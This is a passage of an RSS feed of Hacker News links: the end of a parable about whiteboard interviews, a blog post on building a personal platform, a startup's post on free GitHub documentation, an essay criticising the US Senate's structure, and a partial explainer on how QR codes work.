Now Jim is completely lost. The ingredients of a recipe he has no clue about are something he can guess at, but how is he supposed to guess the recipe itself? He takes his best shot.</p>

<p>
"Break the eggs into a bowl and whisk them with the cream and sugar," guesses Jim.</p>

<p>
"Wrong," says the interviewer.</p>

<p>
"Whisk them with the cream and vanilla?" asks Jim.</p>

<p>
"Still wrong," says the interviewer, "but you were closer the first time."</p>

<p>
"Do you want me to keep guessing?" asks Jim. The interviewer sighs, writes down "completely incompetent", stands up, and says "Thank you for your time. I'll go get the next person."</p>

<p>
Jim stands by the whiteboard and feels confused and out of place. He wonders what&nbsp;crème&nbsp;brûlée has to do with preparing Mexican food. He sits down at the table and googles for&nbsp;crème&nbsp;brûlée on his phone, quickly scanning over the recipe and thinking "that doesn't look too hard at all, I could probably make a great&nbsp;crème&nbsp;brûlée if I had a little practice." The recipe for&nbsp;crème&nbsp;brûlée is in fact quite similar to Flan, and Jim can make great Flan, but unfortunately, the interviewer won't even know as he hasn't asked Jim to cook anything.&nbsp;The next interviewer comes into the room.</p>

<p>
He sits down at the table and scans over Jim's résumé, making a few grunts after scrutinizing various items. "You didn't go to&nbsp;culinary&nbsp;school?"</p>

<div><p>
"No," says Jim, "but I've loved cooking since I was a little kid. I used to cook dinner with my mom every night. I've been working professionally as a chef all my life, and I can prepare great food. Why don't you just take me to the kitchen and let me show you?"</p><p>

"That won't be necessary," says the interviewer. "Now, can you please write on the whiteboard how you would prepare a cheese danish?" Unfortunately, Jim is not a pastry chef either.</p><p>
. &nbsp; . &nbsp; .</p>
<p>
The manager has returned to conclude the interview. "Well Jim," he says, "we've discussed the issue, and we don't think you'd be a good fit here."</p><p>

At this point Jim is entirely expecting this response. Jim is most comfortable in a kitchen, preparing food hands on. He feels out of place trying to explain the theoretical act of preparing food with a whiteboard.&nbsp;Jim loves food so much that whenever he went out for a smoke break with his fellow chefs, he continued to talk about food even when they were on break. Unfortunately, during the interview he didn't get the opportunity to discuss food in this sort of context. Instead he was asked only pointed questions about food items he didn't know how to prepare.</p><p>

"I see," says Jim. "Can I ask you one question before I go?"</p><p>

"Okay," says the manager.</p><p>

"Throughout this interview," Jim asked, "I was asked about preparing confections and pastries, but not once …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.unlimitednovelty.com/2011/12/can-you-solve-this-problem-for-me-on.html">http://www.unlimitednovelty.com/2011/12/can-you-solve-this-problem-for-me-on.html</a></em></p>]]>
            </description>
            <link>http://www.unlimitednovelty.com/2011/12/can-you-solve-this-problem-for-me-on.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023574</guid>
            <pubDate>Sun, 08 Nov 2020 06:25:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I’m Building a Personal Platform Why You Should Too]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25023515">thread link</a>) | @dannyeei
<br/>
November 7, 2020 | http://dasit.xyz/index.php/2020/10/15/building-a-personal-platform/ | <a href="https://web.archive.org/web/*/http://dasit.xyz/index.php/2020/10/15/building-a-personal-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-47">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Recently I’ve got into the idea of building a personal platform for myself. By that I mean a system which makes it easy to distribute new things I’m working on and a way to grow the group of people who could be interested in what I’m working on.</p>



<h2>How I’m going about building a platform</h2>



<ol><li>Leveraging what I already have<ol><li>I have a <a href="https://www.youtube.com/channel/UCjRhOxof_h24gemf8If3Klw?view_as=subscriber">YouTube channel</a> with a following</li><li>I have a network from my personal and professional life</li></ol></li><li>More content<ol><li>This blog</li><li>“Computer Security: Attacking and defending web apps” course on Udemy (because my most successful content on YouTube is about Cyber Security and I’ve had a lot of demand for making a video on how to write shell code)</li><li><a href="https://scenario95.com/">Scenario95</a></li></ol></li><li>Creating a pipeline which I use for all new content<ol><li>Send an email to followers of my platform</li><li>Sharing on several platforms including: Facebook, HackerNews, Reddit, Twitter, and LinkedIn</li></ol></li></ol>



<h2>Why I’m doing this?</h2>



<p>When coming up with new ideas I’ve noticed that I often base them around what I already have access to and natural advantages I’ve got. For example when on a course topic for Udemy, I referred to the YouTube video which I released 4 years ago… and I’ve realised that since finishing university I haven’t done a good job of continuing to create things like this.</p>







<p>This is something I’m new to and and still learning the ropes so if you’ve got any advice please leave it in the comments below. </p>



<p>If you want to follow my adventure then subscribe to my platform! </p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>http://dasit.xyz/index.php/2020/10/15/building-a-personal-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023515</guid>
            <pubDate>Sun, 08 Nov 2020 06:14:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cheapest Online Documentation Repository for Startups]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25023085">thread link</a>) | @timothy-quinn
<br/>
November 7, 2020 | https://blog.congruentlabs.co/the-cheapest-online-documentation-repository-for-startups/ | <a href="https://web.archive.org/web/*/https://blog.congruentlabs.co/the-cheapest-online-documentation-repository-for-startups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.congruentlabs.co/content/images/size/w300/2020/11/Screenshot-2020-11-08-151315.png 300w,
                            https://blog.congruentlabs.co/content/images/size/w600/2020/11/Screenshot-2020-11-08-151315.png 600w,
                            https://blog.congruentlabs.co/content/images/size/w1000/2020/11/Screenshot-2020-11-08-151315.png 1000w,
                            https://blog.congruentlabs.co/content/images/size/w2000/2020/11/Screenshot-2020-11-08-151315.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.congruentlabs.co/content/images/size/w2000/2020/11/Screenshot-2020-11-08-151315.png" alt="The Cheapest Online Documentation Repository for Startups">
            </figure>

            <section>
                <div>
                    <p>I had a problem. I wanted public documentation with open collaboration, but I couldn't afford most of the products out there. As a startup we need to keep lean, and adding a paid documentation/knowledge base service is an expense I don't want to have to try to recover.</p><p>So we're moving all of our product documentation into public Github repositories, as it's the cheapest option with it being free 😉</p><p>The first repository is here, for our Signata MFA product: <a href="https://github.com/cl-tim/signata-mfa-docs">https://github.com/cl-tim/signata-mfa-docs</a></p><h3 id="why-github">Why Github?</h3><p>As much as I find it frustrating to write documentation in markdown (writing is easy, dealing with screenshots is clunky), the benefits of having a publicly accessible repository for documentation far outweighs my frustration.</p><p>I want to make sure documentation isn't sitting behind paywalls or needing a sign up. In fact, forcing people to sign up to read it has created a ton of accounts in our system that don't actually get used, which is an inconvenience for both parties.</p><p>The best part of putting it into Github is now there's the ability to collaborate - if you find a problem, or ambiguous statement, or you want something added, you can now directly interact with the content to submit pull requests or open issues.</p><p>We've also put a link to the documentation onto the Signata MFA website in a few places, which you'll also notice has undergone some rebranding:</p><figure><img src="https://blog.congruentlabs.co/content/images/2020/11/image.png" alt="" srcset="https://blog.congruentlabs.co/content/images/size/w600/2020/11/image.png 600w, https://blog.congruentlabs.co/content/images/size/w1000/2020/11/image.png 1000w, https://blog.congruentlabs.co/content/images/2020/11/image.png 1458w" sizes="(min-width: 720px) 720px"></figure><p>It's actually quite expensive to run an online knowledgebase in most instances. <a href="https://readthedocs.org/">Read the Docs</a> would've been the ideal choice, but it's only free for open source projects, and at this stage we don't yet have plans to open source our products. I could've spun up a self-hosted service like Dokuwiki, but that would be an additional $10/month of operating costs, as well as the administrative overhead for keeping it up to date.</p><p>An alternative we thought about was to use publicly accessible Google Docs, but they lose the ability to be indexed by search engines for people to actually find these guides. There's not much use to public documentation if it's not actually discoverable by the public.</p><h3 id="signata-mfa-presentation">Signata MFA Presentation</h3><p>I've also thrown a presentation that we put together about Signata MFA into the repository as well. <a href="https://github.com/cl-tim/signata-mfa-docs/blob/main/signata-mfa-overview-presentation.pdf">You can find it here</a> - it'll give you a quick overview of the product, it's capabilities, it's pricing, and how to get in contact with us.</p><p>Have you looked at Signata MFA? <a href="https://mfa.signata.net/">You can check it out by clicking here</a>. You can try it for free for a month, no credit card required.</p>
                </div>
            </section>

            
            
        </article>
    </div>
</div></div>]]>
            </description>
            <link>https://blog.congruentlabs.co/the-cheapest-online-documentation-repository-for-startups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023085</guid>
            <pubDate>Sun, 08 Nov 2020 04:45:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Undemocratic Republic: The Tyranny of the Senate]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25022747">thread link</a>) | @krasney
<br/>
November 7, 2020 | https://ni.chol.as/posts/senate-reform/ | <a href="https://web.archive.org/web/*/https://ni.chol.as/posts/senate-reform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>“It may happen that this majority of States is a small minority of the people of America; and two thirds of the people of America could not long be persuaded, upon the credit of artificial distinctions and syllogistic subtleties, to submit their interests to the management and disposal of one third.” Alexander Hamilton, <a href="https://www.newyorker.com/news/hendrik-hertzberg/alexander-hamilton-speaks-out-iii-two-senators-per-state-regardless-of-population" target="_blank" rel="nofollow noopener noreferrer">Federalist 22</a>, December 14, 1787</p>
<p>“Legislators represent people, not trees or acres. Legislators are elected by voters, not farms or cities or economic interests. … And, if a State should provide that the votes of citizens in one part of the State should be given two times, or five times, or 10 times the weight of votes of citizens in another part of the State, it could hardly be contended that the right to vote of those residing in the disfavored areas had not been effectively diluted.” Reynold v Sims</p>
<p>The US Senate has incredible legislative and “advise and consent” powers. It passes bills, but also approves treaties, confirms Cabinet secretaries, Supreme Court justices, judges, and other officials.</p>
<p>It’s 2020, and:</p>
<ul>
<li>~33% of the population lives in just 4 states—California, Texas, Florida, and New York—and is represented by just 8 Senators.</li>
<li>~50% of the population is represented by just 18 Senators</li>
<li>~70% of the population is represented by just ~1/3 of the Senators</li>
<li>
<p>10% of the population is distributed across the 19 least populated states, and control 38 Senators.</p>
<p><span>
      <a href="https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/8affb/Senate-Population.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/8ac56/Senate-Population.webp 240w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/d3be9/Senate-Population.webp 480w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/e46b2/Senate-Population.webp 960w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/a1214/Senate-Population.webp 1254w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/8ff5a/Senate-Population.png 240w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/e85cb/Senate-Population.png 480w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/d9199/Senate-Population.png 960w,
https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/8affb/Senate-Population.png 1254w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://ni.chol.as/static/a4dfaef4c9cc10d6c536bf146ac1e9d1/d9199/Senate-Population.png" alt="/media/Senate-Population.png" title="/media/Senate-Population.png" loading="lazy">
      </picture>
  </a>
    </span></p>
</li>
</ul>
<p>In 1790, the gap between the smallest and largest states was about 10x. Today, the most populous state, California, is about 70x more populous than the least populous state, Wyoming. A resident of California, New York, Florida, or Texas has no effective impact on the Senate impact, and a resident of a smaller state Wyoming, Vermont, Alaska, the Dakotas, Delaware, Rhode Island, or Maine has a disproportionate impact on the Senate.</p>
<p>While the Electoral College favors smaller states as well, it is still mostly driven by membership in the House of Representatives, which is proportionate to population. That’s unfair—the popular vote loser became president in 2000 and 2016— but it’s far less unfair than the even-more-undemocratic Senate.</p>
<p><strong>The Senate has become the defining slow-motion crisis of American democracy.</strong></p>
<ul>
<li><strong>The US Senate could be the <a href="https://nymag.com/intelligencer/2020/08/senate-washington-dc-puerto-rico-statehood-filibuster-obama-biden-racist.html" target="_blank" rel="nofollow noopener noreferrer">most structurally racist institution</a>.</strong> In the 1960s, Black people from the South <a href="https://onlinelibrary.wiley.com/doi/abs/10.3162/036298006X201869" target="_blank" rel="nofollow noopener noreferrer">migrated to populous Northern states</a>, eroding their political representation in the Senate. Similarly, recent decades have seen <a href="https://onlinelibrary.wiley.com/doi/abs/10.3162/036298006X201869" target="_blank" rel="nofollow noopener noreferrer">growing Latinx populations in urban areas</a>, primarily located in populous states. As a result, <a href="https://www.nytimes.com/2018/10/14/opinion/dc-puerto-rico-statehood-senate.html" target="_blank" rel="nofollow noopener noreferrer">David Leonhardt found</a> that whites have 0.35 Senators per million people, Blacks have 0.26, Asian-Americans 0.25, and Latinos just 0.19.</li>
<li><strong>Partisanship and rule changes have caused the problem to boil over.</strong> According to <a href="https://govtrackinsider.com/the-senate-has-never-been-as-un-democratic-as-it-was-in-2017-2018-and-minority-rule-could-801e1046af28" target="_blank" rel="nofollow noopener noreferrer">a 2018 analysis</a>, the Senate has never been as undemocratic as it was in 2017-2018. According to this analysis, “in 2017, for the first time, the Senate’s decisions were often made by a coalition of states representing less than half of the country’s population. The median share of senators supporting passed bills, confirmed judges and agency leaders, and other matters dropped to 58% (the lowest since 1930), with those senators representing just 49.5% of the U.S. population (the lowest ever)!”</li>
</ul>
<p>It’s time for us to revisit the Connecticut Compromise, the Devil’s Bargain that allowed for the adoption of the Constitution at the expense of a democratic Senate.</p>
<h2 id="whats-the-role-of-the-senate"><a href="#whats-the-role-of-the-senate" aria-label="whats the role of the senate permalink"></a>What’s the Role of the Senate?</h2>
<p>The Senate is a smaller, more deliberative body than the House of Representatives. You have to be 30 years old to run for the Senate, and in 1790, you would have had an average life expectancy of about <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2885717/" target="_blank" rel="nofollow noopener noreferrer">45 years</a>. Indeed, “Senator” comes from the Latin word “senex,” which means “senior” or “old man.”</p>
<p>Senators run on staggered 6-year terms, not the 2-year term of the House. That means that their terms exceed presidential terms and—unlike representatives—they don’t have to run in every election. While there are 435 representatives in the House, there are only 100 senators. Unlike members of the House, Senate representatives were meant to be appointed by the state legislatures, a process that changed after the 17th amendment in 1913. This meant that the Senate was meant to be a kind of U.N.-but-with-teeth for 13 (and now 50) coequal sovereigns.</p>
<p>These features—insulation from short-term political pressure and a more selective and deliberative group of representatives—are unrelated to the two-per-state design of the US Senate, and don’t benefit from it.</p>
<h2 id="the-connecticut-compromise-was-pragmatic-but-not-wise"><a href="#the-connecticut-compromise-was-pragmatic-but-not-wise" aria-label="the connecticut compromise was pragmatic but not wise permalink"></a>The Connecticut Compromise was Pragmatic, but Not Wise</h2>
<p>Some people defend the Connecticut Compromise as an enduring legacy of founder wisdom. But the Connecticut Compromise wasn’t meant to be wise, it was meant to be pragmatic. </p>
<p>Seven weeks into the Constitutional Convention of 1787, the founders were at an impasse.</p>
<p>Many large states felt that representation should be proportional to population in Congress. As larger states would be contributing more to the treasury and defense, they felt that should have more say.</p>
<p>Smaller states like Delaware and Rhode Island—and representatives from certain larger but slower-growing states like New York (except for Alexander Hamilton, of course)—weren’t having it, and had leverage. These states enjoyed authority and autonomy under the Articles of Confederation. Proportionate representation—plus anticipation of a rapidly growing South and West—would erode their political power.</p>
<p>Connecticut delegates Roger Sherman and Oliver Ellsworth, with the support of Benjamin Franklin, struck a compromise: a bicameral (two-chambered) legislature, with one chamber, the House of Representatives, allocating seats in proportion to population, and the other chamber, the Senate, allocated evenly by state. Benjamin Franklin proposed that the House originate all revenue matters.</p>
<p>Alexander Hamilton hated it. Writing in Federalist 22:</p>
<blockquote>
<p>Its operation contradicts the fundamental maxim of republican government, which requires that the sense of the majority should prevail. Sophistry may reply, that sovereigns are equal, and that a majority of the votes of the States will be a majority of confederated America. But this kind of logical legerdemain will never counteract the plain suggestions of justice and common-sense.</p>
</blockquote>
<p>Madison, in Federalist 62, didn’t want to defend it:</p>
<blockquote>
<p>The equality of representation in the Senate is another point, which, being evidently the result of compromise between the opposite pretensions of the large and the small States, does not call for much discussion.</p>
</blockquote>
<p>The decision to allocate Senate seats was a compromise needed to ratify the Constitution and satisfice an existing power structure—nothing more.</p>
<h2 id="this-is-the-hardest-thing-to-change-about-the-constitution"><a href="#this-is-the-hardest-thing-to-change-about-the-constitution" aria-label="this is the hardest thing to change about the constitution permalink"></a>This is the Hardest Thing to Change about the Constitution</h2>
<p>One possible mechanism of reform is amending the Constitution. Suppose you wanted to change the Senate to allocate seats in proportion to population. Not so fast—Article V of the Constitution writes that:</p>
<blockquote>
<p><strong>The Congress, whenever two thirds of both Houses shall deem it necessary, shall propose Amendments to this Constitution,</strong> or, on the Application of the Legislatures of two thirds of the several States, shall call a Convention for proposing Amendments, which, in either Case, shall be valid to all Intents and Purposes, as Part of this Constitution, when ratified by the Legislatures of three fourths of the several States, or by Conventions in three fourths thereof, as the one or the other Mode of Ratification may be proposed by the Congress; Provided that no Amendment which may be made prior to the Year One thousand eight hundred and eight shall in any Manner affect the first and fourth Clauses in the Ninth Section of the first Article; <strong>and that no State, without its Consent, shall be deprived of its equal Suffrage in the Senate.</strong></p>
</blockquote>
<p>Article V articulates a state right—equal suffrage in the Senate—that cannot be deprived through the Constitutional change process. Put differently: you can change anything in the Constitution (after 1808) through amendments or a convention, but you cannot change this aspect of the Connecticut Compromise.</p>
<p>In practice, even Justice Scalia <a href="https://www.newyorker.com/news/hendrik-hertzberg/the-weirdest-sentence-in-the-u-s-constitution" target="_blank" rel="nofollow noopener noreferrer">once remarked</a> that he didn’t see how the Supreme Court could declare a properly proposed and ratified Constitutional amendment unconstitutional. It is unclear how a future Supreme Court might view a dispute around this kind of Constitutional amendment, although any well-written amendment would begin by changing Article V.</p>
<p>Notwithstanding this speed bump, passing constitutional amendments requires the consent of 3/4 of the states, meaning that the 12 least populous states could block any Senate reform amendment.</p>
<h2 id="finding-a-way-out"><a href="#finding-a-way-out" aria-label="finding a way out permalink"></a>Finding a Way Out</h2>
<h2 id="what-does-a-good-solution-look-like"><a href="#what-does-a-good-solution-look-like" aria-label="what does a good solution look like permalink"></a>What does a good solution look like?</h2>
<p>An improvement to the representation problem has the following qualities:</p>
<ul>
<li>It is legal. In this sense, legal means that it would survive a challenge in the Supreme Court in which the justices were approved by a partisan Senate.</li>
<li>It preserves the “deliberative” aspects of the Senate.</li>
<li>It reduces population inequality in the Senate.</li>
<li>It is politically tractable.</li>
</ul>
<p>A better solution to this problem has these additional properties:</p>
<ul>
<li>New statehood, or reorganized statehood, is incentive-compatible. That means that citizens of prospective new states (Puerto Rico, for instance) should have the opportunity to form a state and be admitted to the Senate without disproportionately diluting power.</li>
<li>Senate proportionality is robust to population shifts. If Wyoming became a booming population center, then Wyoming should have more Senate representation.</li>
<li>It decreases wasted votes and reduces the <a href="https://www.brennancenter.org/sites/default/files/legal-work/How_the_Efficiency_Gap_Standard_Works.pdf" target="_blank" rel="nofollow noopener noreferrer">efficiency gap</a>. Conservatives in California and liberals in Texas have important interests, and they deserve a say.</li>
</ul>
<h3 id="state-swaps"><a href="#state-swaps" aria-label="state swaps permalink"></a>State Swaps</h3>
<p>The Constitution didn’t anticipate political parties, and Washington’s farewell address decried them as “likely in the course of time and things, to become potent engines, by which cunning, ambitious, and unprincipled men will …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ni.chol.as/posts/senate-reform/">https://ni.chol.as/posts/senate-reform/</a></em></p>]]>
            </description>
            <link>https://ni.chol.as/posts/senate-reform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022747</guid>
            <pubDate>Sun, 08 Nov 2020 03:50:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[QR Codes Aren't Magic]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25022738">thread link</a>) | @allending
<br/>
November 7, 2020 | https://blog.snappymob.com/qr-codes-arent-actually-magic | <a href="https://web.archive.org/web/*/https://blog.snappymob.com/qr-codes-arent-actually-magic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Especially after COVID-19 began plaguing the planet, QR codes have been a big part of our daily lives. In this day and age, it’s quite impossible for one to have never seen a QR code, or used one. Even before the pandemic, QR codes had been around us for a while, but many of us — having grown up in the Digital Age — simply accept new technology into our lives without wondering too much about how they work. For most of us, QR codes just look like... square pixelated versions of the alien heptapod symbols in Arrival (2016), that somehow, magically (and really quickly) bring us to a different screen when we scan them.</p>
<!--more-->
<p>So what are these cryptic codes? Are they magic? Clearly they’re not, but how do they work? Before we take you in for the ride, let’s get the basics down.&nbsp;</p>
<p>QR stands for <em>Quick Response</em>, and a QR code is pretty much a barcode (which has been around since the 1950s) except two-dimensional. Because it’s 2D, it can contain more data than a barcode. It can encode over 7000 characters, which is a vast improvement from the standard barcode with a limited capacity of about 20 alphanumeric characters.</p>
<h2>How did they come about?&nbsp;</h2>
<p>In Japan circa 1990s, Denso Wave Incorporated was contacted by manufacturing sites and asked if it was possible to come up with a faster barcode scanning system. This presented a problem as barcodes had a limited capacity, which made the scanning process time consuming for workers no matter how efficient the scanner was. To tackle this, Denso Wave began developing a compact code that can contain more data, including Kanji and Kana characters. The launch of the QR code was later announced in 1994.</p>
<h2>What are they used for?</h2>
<p>The QR code was first used by the auto industry to track parts and products shipped around the globe. Then, gradually, other industries all over the world began joining in. Today, QR codes are used by nearly every physical and digital establishment for quick check-ins, displaying geolocation or contact info, redirecting customers to their websites, etc.</p>
<h2>How do they work?</h2>
<p>Grasping how a QR code works would require understanding the functions of its different parts. With the help of the labelled diagram, we hope to make this palatable for the layman. Let’s break it down.</p>
<p><img src="https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=715&amp;name=QR%20Structure.png" alt="QR Structure, modules, separators, alignment, timing, format info, version, labels, black and white" width="715" srcset="https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=358&amp;name=QR%20Structure.png 358w, https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=715&amp;name=QR%20Structure.png 715w, https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=1073&amp;name=QR%20Structure.png 1073w, https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=1430&amp;name=QR%20Structure.png 1430w, https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=1788&amp;name=QR%20Structure.png 1788w, https://blog.snappymob.com/hs-fs/hubfs/QR%20Structure.png?width=2145&amp;name=QR%20Structure.png 2145w" sizes="(max-width: 715px) 100vw, 715px"></p>
<p>(Image Source: techspot.com)</p>
<p>The tiny squares in a QR code are called <em><strong>modules</strong></em> - black squares would be considered foreground modules, and white ones would be background modules. They don’t always have to be black and white, though, they could be in color too. Most QR codes are in black and white only so decoder softwares easily distinguish the contrast between the background and foreground. If you want your QR code to be colorful, you just have to make sure that the contrast is retained when it is in grayscale / black and white.</p>
<p>The bigger the code, the more rows and columns of modules it will contain. Yup, just like humankind, QR codes come in different shapes, sizes and colors (although there are standards to follow).</p>
<p>There are 40 preset sizes (or, <em><strong>versions</strong></em>) to choose from. Version 1 being the smallest type with 21 rows and 21 columns, and Version 40 being the largest with 177 rows and 177 columns. When a generator produces a code for you, it will determine the suitable QR code version number for you depending on the amount of data you are encoding.</p>
<p>The 3 big squares on 3 corners of the QR code are <em><strong>finder patterns</strong></em>, which help your device camera determine the boundaries of the code and its correct orientation. This is so if the code is rotated, or upside-down, decoders would still be able to read it. These finder patterns are surrounded by a single-module spacing called <em><strong>separators</strong></em> which help decoders separate the finder patterns from the code data.</p>
<p>Connecting each finder pattern are <em><strong>timing patterns</strong></em> that alternate between black and white. These lines tell your decoder software how big the data cells are within the code.</p>
<p>The smaller square (that is distinctively not a finder pattern) on the fourth corner is an <em><strong>alignment pattern</strong></em> that helps the decoder prevent image distortions. Level 1 QR codes (the smallest size of QR codes) do not contain alignment patterns. The bigger the code, however, the more alignment patterns are added.&nbsp;</p>
<p>The 15 bits beside the separators are <em><strong>format and version strings</strong></em> which contain information on the code’s error correction level and the chosen mask pattern for the particular code. Hold on… information on the what and what?</p>
<p><em><strong>Error correction</strong></em> code makes sure that the code is still readable if up to 30% of the code is corrupt. Designers or generators of a code can decide how many levels of error correction they want to include in the code. The higher the level of error correction, the higher percentage of corruption a decoder can read past. However, the higher the level of error correction, the more space it takes up on the QR code, leaving less space for data. In other words, the more space the error correction code takes up, the lower the max numerical characters a QR code can fit. How much error correction a QR code needs probably will depend on where it will be displayed. E.g. A QR code on a paper flyer would need higher error correction than one on a laminated poster placed indoors, and a digital QR code could do with none because it is unlikely to be damaged.</p>
<p>The code is also overlaid by a <em><strong>mask pattern</strong></em>, inverting and retaining certain data areas to “mix it up” / conceal it. Decoder softwares detect the mask type from the format information and demask the QR code before reading the rest of the data. Of course this happens in a matter of milliseconds.</p>
<p><em><strong>Encoded characters </strong></em>- The black and white modules read in a fixed zigzaggy direction (as shown in the image), starting from the bottom right corner, gives the decoder a sequence of data bits that goes something like 001010111…&nbsp;&nbsp;&nbsp;</p>
<p><img src="https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=447&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png" alt="QR code, zigzag sequence, binary sequence, pattern" width="447" srcset="https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=224&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 224w, https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=447&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 447w, https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=671&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 671w, https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=894&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 894w, https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=1118&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 1118w, https://blog.snappymob.com/hs-fs/hubfs/Google%20Drive%20Integration/Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png?width=1341&amp;name=Copy%20of%20(Writeup)%20QR%20codes%20arent%20actually%20magic-2.png 1341w" sizes="(max-width: 447px) 100vw, 447px"><br>(Image Source: nayuki.io)</p>
<p>Different binary sequences represent different codewords, which include symbols, lowercase letters, uppercase letters, etc. For example, the binary sequence 01110111 represents the letter ‘w’, 00100001 represents the exclamation point ‘!’, and 00100000 represents a space.</p>
<h2><strong>How can you make a QR code?</strong></h2>
<p><span><img src="https://lh3.googleusercontent.com/Mi8ate-UiC0ZpKEoRFn8EUpe5bZDS5O6ggTSK96wPR1OTHx_zoKu_dbS5NvJDpPRsDAt9qdHXkQdfo1sm8Jun4Id0dpS3JjSnmOO51mXv6NT1ql7rb5P0DJc01k-kuw9RYw5vMF2" alt="QR code, generated QR code, snappymob website" width="297"></span></p>
<p>Here’s a QR code generated with <a href="http://www.qr-code-generator.com/"><span>www.qr-code-generator.com</span></a>. Do the patterns make a lot more sense to you now? If you can’t answer in confidence, that’s okay. You’re not going to have to make one by hand, ever. (Unless you want to.)&nbsp;</p>
<p>There are plenty of offline and online QR code generators free for use. All you have to do is key in what you want to encode in the QR code, be it a link to a coupon redemption page, a YouTube video, your social media sites, your contact details, or simply a website homepage.&nbsp;</p>
<p>Most free QR code generators, though, require you to sign up or subscribe to a plan to gain access to more design options and features, such as error correction levels and insights tracking.&nbsp;</p>
<h2><strong>How can QR codes help you?</strong></h2>
<p>Whether you own a business or simply have a web page to share, a QR code could help people reach you easily and quickly. In case you were looking for ideas, here are some of the ways in which using a QR code could greatly benefit you:</p>
<h4><strong>Webpages and Location</strong></h4>
<p>Your customers can get to your website, social media platforms, or map location in a matter of seconds. They don’t have to manually type your website URL, usernames, or addresses into their browsers or maps. They simply need to whip out their phones and scan the QR code to be redirected to you.</p>
<h4><strong>Payment</strong></h4>
<p>Payment is also made easy with QR codes. Most stores enable QR codes for quick payment via e-wallets so customers don’t have to fumble through their wallets for cash and keep others waiting. Some good examples would be GrabPay or ShopeePay, which are enabled at many on and offline merchants in Malaysia.</p>
